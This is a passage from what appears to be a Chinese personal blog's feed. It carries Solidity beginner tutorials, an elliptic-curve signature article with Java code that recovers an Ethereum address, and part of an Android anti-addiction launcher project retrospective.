版本。0.4.0-0.4.9 之间的小版本改动通常不会有破坏性更改，源代码应该都是兼容的。</li><li>第三行，创建了一个名字为 “SimpleStorage”的合约。</li><li>第四行，合约中，定义了一个变量message</li></ul><h2 id="合约编译"><a href="#合约编译" class="headerlink" title="合约编译"></a>合约编译</h2><p><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220506180910.png" alt="20220506180910"></p><h2 id="合约部署"><a href="#合约部署" class="headerlink" title="合约部署"></a>合约部署</h2><p><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220506181410.png" alt="20220506181410"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;学solidity已经2年了，平日除了偶尔写一点点合约喝读一点合约之外，几乎没有用武之地（工作中也用不到）。导致目前渐渐的有些生疏了。现在捡</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 区块链" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="区块链" scheme="https://www.memestarter.top/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="合约" scheme="https://www.memestarter.top/tags/%E5%90%88%E7%BA%A6/"/>
    
    <category term="教程" scheme="https://www.memestarter.top/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="solidity" scheme="https://www.memestarter.top/tags/solidity/"/>
    
  </entry>
  
  <entry>
    <title>区块链合约之10天学会solidity第三节-合约结构</title>
    <link href="https://www.memestarter.top/2022/04/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E4%B8%89%E8%8A%82-%E5%90%88%E7%BA%A6%E7%BB%93%E6%9E%84/"/>
    <id>https://www.memestarter.top/2022/04/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E4%B8%89%E8%8A%82-%E5%90%88%E7%BA%A6%E7%BB%93%E6%9E%84/</id>
    <published>2022-04-29T00:40:30.000Z</published>
    <updated>2022-05-28T14:56:25.075Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学solidity已经2年了，平日除了偶尔写一点点合约喝读一点合约之外，几乎没有用武之地（工作中也用不到）。导致目前渐渐的有些生疏了。现在捡起来，希望有人一起再次一起学习。学习学习，有输入和输出才能学的更好。所以，我计划，没两天更新一波学习记录。我会把学习记录写成系列文章，把代码放到github，期待一起进步。也请大家到我的GitHub 给我star呀！也欢迎给我留言加个好友啥的。如果给我star的，联系我我会拉个共同学习的群v（jingyiwei）。<br>GitHub：<a href="mailto:&#103;&#105;&#x74;&#x40;&#x67;&#105;&#116;&#104;&#x75;&#98;&#46;&#99;&#x6f;&#x6d;">&#103;&#105;&#x74;&#x40;&#x67;&#105;&#116;&#104;&#x75;&#98;&#46;&#99;&#x6f;&#x6d;</a>:it114&#x2F;learn-solidity-30day.git<br>本文原文发表在张智进博客：<a href="https://www.memestarter.top/">https://www.memestarter.top/</a></p><h1 id="合约结构"><a href="#合约结构" class="headerlink" title="合约结构"></a>合约结构</h1><p>在上一篇中初步认识了合约，下面看一下在合约中都有哪些重要的构成。这一节的目的是的对合约有一个大致的印象。不会说太多的细节，只是我们可以在宏观上知道合约的构成，在后面的学习中做到心中有数。</p><p>solidity中合约其他面向对象编程语言中的类比较类似。在其他编程语言中类声明，变量声明等特性在合约中大致都可以找到相关的影子。只不过是换了个名字而已。</p><p>合约中可以包含大致有状态变量、 函数、 函数修饰器、事件、 结构类型、枚举类型，并合约也有继承机制</p><h2 id="状态变量"><a href="#状态变量" class="headerlink" title="状态变量"></a>状态变量</h2><p>状态变量存储在内存中，按照java或者别的面向对象的语言来理解，可以理解为类的成员变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string message; // 状态变量 ，消息</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数是为了完成一些具有一定功能的代码的集合，可以被合约内部或者外部调用（注意函数的修饰符）<br>例如,下边是一个名称是setMessage的函数，接受一个string类型的参数，函数的可见性是public意味着在其他合约中也可以被调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 设置消息函数</span><br><span class="line">    function setMessage(string amsg) public  isOwner &#123;  </span><br><span class="line">        message = amsg;</span><br><span class="line">        emit MessageChanged(msg.sender,amsg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="修饰器"><a href="#修饰器" class="headerlink" title="修饰器"></a>修饰器</h2><p>如上面的函数。函数的调用必须受到isOwner的限制。如果不是owener调用函数，就会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 修饰器，这里判断交易是否是合约创建者发起交易</span><br><span class="line">   modifier isOwner() &#123;</span><br><span class="line">       require(msg.sender == owner, &quot;Caller is not owner&quot;);</span><br><span class="line">       _;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="合约事件"><a href="#合约事件" class="headerlink" title="合约事件"></a>合约事件</h2><p>合约事件可以把合约运行过程中的事情给抛出去。关注这个事件的使用方可以关注并且根据事件做出自己的响应。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 定义事件</span><br><span class="line">   event MessageChanged(address addr,string message);</span><br></pre></td></tr></table></figure><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>其实，合约如果理解为一个java或者c#或者php等面向对象语言中的一个类，就会好很多。这篇文章只是简单的列举了合约中的一些成员，函数，事件等。没有涉及的内容太多，这里我们对合约结构有一个大致印象即可。</p><p>下面是一个完整的代码 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract SimpleStorage   &#123;</span><br><span class="line">    string message; // 状态变量 ，消息</span><br><span class="line">    address private owner;  // 状态变量 ，合约部署者</span><br><span class="line"></span><br><span class="line">    // 定义事件</span><br><span class="line">    event MessageChanged(address addr,string message);</span><br><span class="line"></span><br><span class="line">    // 构造方法，部署合约的时候调用</span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 修饰器，这里判断交易是否是合约创建者发起交易</span><br><span class="line">    modifier isOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Caller is not owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 设置消息函数</span><br><span class="line">    function setMessage(string amsg) public  isOwner &#123;  </span><br><span class="line">        message = amsg;</span><br><span class="line">        emit MessageChanged(msg.sender,amsg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 读取消息函数</span><br><span class="line">    function getMessage() external  view  returns (string)&#123;</span><br><span class="line">        return message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署合约之后，我们就可以在remix ide里面调用 setMessage，然后调用 getMessage  就会看到我们刚才设置的 message<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220508214200.png" alt="20220508214200"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;学solidity已经2年了，平日除了偶尔写一点点合约喝读一点合约之外，几乎没有用武之地（工作中也用不到）。导致目前渐渐的有些生疏了。现在捡</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 区块链" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="区块链" scheme="https://www.memestarter.top/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="合约" scheme="https://www.memestarter.top/tags/%E5%90%88%E7%BA%A6/"/>
    
    <category term="教程" scheme="https://www.memestarter.top/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="solidity" scheme="https://www.memestarter.top/tags/solidity/"/>
    
    <category term="blockchain" scheme="https://www.memestarter.top/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>区块链合约之10天学会solidity第一节-remix ide</title>
    <link href="https://www.memestarter.top/2022/04/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E4%B8%80%E8%8A%82-remix%20ide/"/>
    <id>https://www.memestarter.top/2022/04/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E4%B8%80%E8%8A%82-remix%20ide/</id>
    <published>2022-04-28T10:11:20.000Z</published>
    <updated>2022-05-28T14:55:04.446Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学solidity已经2年了，平日除了偶尔写一点点合约喝读一点合约之外，几乎没有用武之地（工作中也用不到）。导致目前渐渐的有些生疏了。现在捡起来，希望有人一起再次一起学习。学习学习，有输入和输出才能学的更好。所以，我计划，没两天更新一波学习记录。我会把学习记录写成系列文章，把代码放到github，期待一起进步。也请大家到我的GitHub 给我star呀！也欢迎给我留言加个好友啥的。如果给我star的，联系我我会拉个共同学习的群v（jingyiwei）。<br>GitHub：<a href="mailto:&#x67;&#105;&#x74;&#64;&#x67;&#x69;&#x74;&#104;&#117;&#x62;&#46;&#x63;&#x6f;&#x6d;">&#x67;&#105;&#x74;&#64;&#x67;&#x69;&#x74;&#104;&#117;&#x62;&#46;&#x63;&#x6f;&#x6d;</a>:it114&#x2F;learn-solidity-30day.git<br>本文原文发表在张智进博客：<a href="https://www.memestarter.top/">https://www.memestarter.top/</a></p><h1 id="合约ide"><a href="#合约ide" class="headerlink" title="合约ide"></a>合约ide</h1><p>和很多编程语言一样，当你问学过的人该用什么ide来开发。清高的人活着xx的人会告诉你：记事本也可以。对于新手来说，一款好的编译器能帮助初学者少走弯路，建立信心。回忆起我的初学之后，从最初的vs code 到 <a href="https://remix.ethereum.org/">https://remix.ethereum.org/</a> 在线ide，再到remix 桌面ide，最后还是觉得桌面ide要要用一些。说一下优缺点吧 </p><ul><li>VS code<br>需要安装插件，而且这个插件还有不同的开发者开发的插件，初学者要去选择。代码变现到编译到部署，中间要用到几个插件，都需要要初学者去探索。</li><li>remix 在线ide<br>打开网址就能编写代码，同一个ide，几乎啥都不配置，可以执行编写，编译和部署等诸多步骤。上手快，无需下载，用完即走</li><li>remix 桌面ide<br>和在线的remix一样，不一样的是可以打开本地workspace还有一些高级功能待探索。</li></ul><h1 id="remix"><a href="#remix" class="headerlink" title="remix"></a>remix</h1><h2 id="认识工作区"><a href="#认识工作区" class="headerlink" title="认识工作区"></a>认识工作区</h2><p>工作区大致如下，各个区域的功能<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220430183656.png" alt="20220430183656"></p><p>在编译页面，重要的配置项<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220430183827.png" alt="20220430183827"></p><p>部署页面重要配置项<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220430184102.png" alt="20220430184102"></p><p>第一段就到这了，需要多练多写</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;学solidity已经2年了，平日除了偶尔写一点点合约喝读一点合约之外，几乎没有用武之地（工作中也用不到）。导致目前渐渐的有些生疏了。现在捡</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 区块链" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="区块链" scheme="https://www.memestarter.top/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="合约" scheme="https://www.memestarter.top/tags/%E5%90%88%E7%BA%A6/"/>
    
    <category term="ide" scheme="https://www.memestarter.top/tags/ide/"/>
    
    <category term="solidity教程" scheme="https://www.memestarter.top/tags/solidity%E6%95%99%E7%A8%8B/"/>
    
    <category term="教程" scheme="https://www.memestarter.top/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="blockchain" scheme="https://www.memestarter.top/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>椭圆曲线签名之区块链签名验证</title>
    <link href="https://www.memestarter.top/2022/04/26/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%AD%BE%E5%90%8D%E4%B9%8B%E5%8C%BA%E5%9D%97%E9%93%BE%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/"/>
    <id>https://www.memestarter.top/2022/04/26/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%AD%BE%E5%90%8D%E4%B9%8B%E5%8C%BA%E5%9D%97%E9%93%BE%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81/</id>
    <published>2022-04-26T03:12:04.000Z</published>
    <updated>2022-05-28T14:55:20.303Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h1><p>学过计算机的人都知道知名度rsa加密算法。它使用了两个数字相乘很容易，但是把一个大数字分解为素数却很难的这个原理，来实现对称加密。但是随着计算机的发展rsa的安全性越来越受到挑战。于是在bitcoin中一个叫做椭圆曲线算法的对称加密算法被使用，并且在长期实践中证明了其安全性。</p><h1 id="椭圆曲线算法"><a href="#椭圆曲线算法" class="headerlink" title="椭圆曲线算法"></a>椭圆曲线算法</h1><p>椭圆曲线密码术是一种基于离散对数问题的非对称或公钥密码体系，如椭圆曲线上的加法和乘法运算。作为一种对称加密算法，椭圆曲线算法比ras算法用更小的公钥，实现更高的效率，实现了更高的安全性。</p><p>数字签名在比特币中有三种用途。</p><ol><li>签名证明私钥的所有者，即资金所有者，已经授权支出这些资金。</li><li>授权证明是不可否认的 （不可否认性）</li><li>签名证明交易（或交易的具体部分）在签字之后没有也不能被任何人修改</li></ol><h2 id="算法介绍"><a href="#算法介绍" class="headerlink" title="算法介绍"></a>算法介绍</h2><p>这部分可以参考：精通以太坊 （中文版）：<a href="https://www.bookstack.cn/read/ethereum_book-zh/spilt.6.4e6f5cb249c84882.md">https://www.bookstack.cn/read/ethereum_book-zh/spilt.6.4e6f5cb249c84882.md</a></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h2 id="椭圆曲线算法实现"><a href="#椭圆曲线算法实现" class="headerlink" title="椭圆曲线算法实现"></a>椭圆曲线算法实现</h2><p>总的来说，首先要生成一个随机数根据K&#x3D;k*P ，来确定私钥。<br>具体的在数字签名的时候，区块链使用的算法和正规的椭圆曲线算法有一定的差异。经过签名的消息是可以被分解为 r ，s的。只靠rs所反解的public key会有四组，不过实际上最常见的是2组，因为另外两种出现的概率很低很低。这篇文章有具体的说明：<a href="https://bitcoin.stackexchange.com/questions/38351/ecdsa-v-r-s-what-is-v">https://bitcoin.stackexchange.com/questions/38351/ecdsa-v-r-s-what-is-v</a> 。 </p><h2 id="椭圆曲线算法签名实现"><a href="#椭圆曲线算法签名实现" class="headerlink" title="椭圆曲线算法签名实现"></a>椭圆曲线算法签名实现</h2><p>下面是代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public class Sign &#123;</span><br><span class="line"></span><br><span class="line">    public static final String PERSONAL_MESSAGE_PREFIX = &quot;\u0019Ethereum Signed Message:\n&quot;;</span><br><span class="line"></span><br><span class="line">    public static void RecoverAddress) &#123;</span><br><span class="line"></span><br><span class="line">        String signature = &quot;xxxx&quot;;</span><br><span class="line"></span><br><span class="line">        String address = &quot;yyyy&quot;;</span><br><span class="line">        String message = &quot;msg&quot;;</span><br><span class="line"></span><br><span class="line">        String prefix = PERSONAL_MESSAGE_PREFIX + message.length();</span><br><span class="line">        byte[] msgHash = Hash.sha3((prefix + message).getBytes());</span><br><span class="line"></span><br><span class="line">        byte[] signatureBytes = Numeric.hexStringToByteArray(signature);</span><br><span class="line">        byte v = signatureBytes[64];</span><br><span class="line">        if (v &lt; 27) &#123;</span><br><span class="line">            v += 27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        SignatureData sd =</span><br><span class="line">                new SignatureData(</span><br><span class="line">                        v,</span><br><span class="line">                        (byte[]) Arrays.copyOfRange(signatureBytes, 0, 32),</span><br><span class="line">                        (byte[]) Arrays.copyOfRange(signatureBytes, 32, 64)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        String addressRecovered = null;</span><br><span class="line">        boolean match = false;</span><br><span class="line"></span><br><span class="line">        // Iterate for each possible key to recover</span><br><span class="line">        for (int i = 0; i &lt; 4; i++) &#123;</span><br><span class="line">            BigInteger publicKey =</span><br><span class="line">                    Sign.recoverFromSignature(</span><br><span class="line">                            (byte) i,</span><br><span class="line">                            new ECDSASignature(</span><br><span class="line">                                    new BigInteger(1, sd.getR()), new BigInteger(1, sd.getS())),</span><br><span class="line">                            msgHash);</span><br><span class="line"></span><br><span class="line">            if (publicKey != null) &#123;</span><br><span class="line">                addressRecovered = &quot;0x&quot; + Keys.getAddress(publicKey);</span><br><span class="line"></span><br><span class="line">                if (addressRecovered.equals(address)) &#123;</span><br><span class="line">                    match = true;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (addressRecovered.equals(address)) &#123;</span><br><span class="line">            System.out.println(&quot; recovered ... &quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (match) &#123;</span><br><span class="line">            System.out.println(&quot; match ... &quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;对称加密&quot;&gt;&lt;a href=&quot;#对称加密&quot; class=&quot;headerlink&quot; title=&quot;对称加密&quot;&gt;&lt;/a&gt;对称加密&lt;/h1&gt;&lt;p&gt;学过计算机的人都知道知名度rsa加密算法。它使用了两个数字相乘很容易，但是把一个大数字分解为素数却很难的这个原理，来实现对称</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 区块链" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="区块链" scheme="https://www.memestarter.top/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="算法" scheme="https://www.memestarter.top/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="数字签名" scheme="https://www.memestarter.top/tags/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    
    <category term="blockchain" scheme="https://www.memestarter.top/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>防沉迷app-项目总结2</title>
    <link href="https://www.memestarter.top/2022/04/26/%E9%98%B2%E6%B2%89%E8%BF%B7app-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%932/"/>
    <id>https://www.memestarter.top/2022/04/26/%E9%98%B2%E6%B2%89%E8%BF%B7app-%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%932/</id>
    <published>2022-04-26T02:50:08.000Z</published>
    <updated>2022-04-26T03:12:29.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="防沉迷项目总结（2）"><a href="#防沉迷项目总结（2）" class="headerlink" title="防沉迷项目总结（2）"></a>防沉迷项目总结（2）</h1><h2 id="软件开发的需求变动问题"><a href="#软件开发的需求变动问题" class="headerlink" title="软件开发的需求变动问题"></a>软件开发的需求变动问题</h2><p>作为开发者，最不喜欢的场景是需求朝令夕改。频繁的需求改动对开发者的耐性和信心是极大的打击。</p><ol><li>心情：这个就不用多说了，开发是很枯燥的。让程序员重复做一个事情，不停的重复更枯燥。</li><li>设计问题：最初a需求的技术方案，开发者设计好了，需求变了之后，技术方案都有可能会受到影响。</li></ol><p>对于这个问题，目前是无解。市场是对的，老板也是对的，需求没错。所以就需要开发者提高自身素质，对潜在的需求变动要有前瞻性。在技术设计方面<br>对于可能的变动预留足够的弹性空间。</p><h3 id="一个被需求折磨的例子"><a href="#一个被需求折磨的例子" class="headerlink" title="一个被需求折磨的例子"></a>一个被需求折磨的例子</h3><p>需求a：桌面app只需要显示和隐藏<br>a基础上改动后的需求b：要初始化显示系统app，同时行列也要变化。</p><p>这块改动比较大，改动之前的就不贴代码了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"> package com.benny.openlauncher.util;</span><br><span class="line"></span><br><span class="line">import android.util.Log;</span><br><span class="line"></span><br><span class="line">import com.benny.openlauncher.AppObject;</span><br><span class="line">import com.benny.openlauncher.activity.HomeActivity;</span><br><span class="line">import com.benny.openlauncher.model.App;</span><br><span class="line">import com.benny.openlauncher.model.Item;</span><br><span class="line">import com.benny.openlauncher.widget.CellContainer;</span><br><span class="line">import com.benny.openlauncher.widget.Desktop;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">// 桌面app排列有关工具类</span><br><span class="line">public class DeskTopUtils &#123;</span><br><span class="line"></span><br><span class="line">    // 第一次初始化</span><br><span class="line">    public static void onCreate(List&lt;App&gt; apps) &#123;</span><br><span class="line">       // TODO </span><br><span class="line">    &#125;</span><br><span class="line">    // 添加到hide，并从数据库移除</span><br><span class="line">    public static void removeFromDesk(String pkg) &#123;</span><br><span class="line">        Log.d(&quot;DeskTopUtils&quot;,&quot;remove local app from desk pkg:&quot;+ pkg);</span><br><span class="line">        // hide 更新</span><br><span class="line">        